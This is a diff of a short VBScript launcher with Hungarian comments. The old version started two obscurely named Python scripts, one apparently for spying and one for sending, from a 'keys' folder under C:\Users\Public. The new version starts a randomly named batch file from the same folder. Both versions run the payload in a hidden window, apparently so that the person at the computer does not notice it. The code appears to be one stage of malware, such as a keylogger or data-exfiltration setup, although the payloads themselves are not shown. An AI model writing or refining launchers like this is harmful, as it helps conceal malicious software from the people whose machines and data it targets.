@@ -1,24 +1,22 @@
 Option Explicit
 
-Dim shell, baseDir, spwPath, sendPath, fso
+Dim shell, baseDir, batPath, fso
 Set shell = CreateObject("WScript.Shell")
 Set fso = CreateObject("Scripting.FileSystemObject")
 
+' A mappa, ahol feltételezzük, hogy a .bat fájl van
 baseDir = "C:\Users\Public\Documents\keys"
 
-spwPath = baseDir & "\spwww743g7w.py"
-sendPath = baseDir & "\fwsendbfgw.py"
+' A Batch fájl teljes útvonala
+batPath = baseDir & "\vw2i45ibzfrun2.bat"
 
-If Not fso.FileExists(spwPath) Then
-    MsgBox "spw.py not found: " & spwPath
-    WScript.Quit
-End If
 
-If Not fso.FileExists(sendPath) Then
-    MsgBox "send.py not found: " & sendPath
+' Ellenőrizzük, hogy a .bat fájl létezik-e
+If Not fso.FileExists(batPath) Then
+    MsgBox "A Batch fájl nem található: " & batPath
     WScript.Quit
 End If
 
 ' Láthatatlan háttérben futtatás
-shell.Run "cmd /c start """" /B py """ & spwPath & """", 0, False
-shell.Run "cmd /c start """" /B py """ & sendPath & """", 0, False
+' 0 = Rejtett ablak, False = Nem várjuk meg a befejezést
+shell.Run "cmd /c """ & batPath & """", 0, False
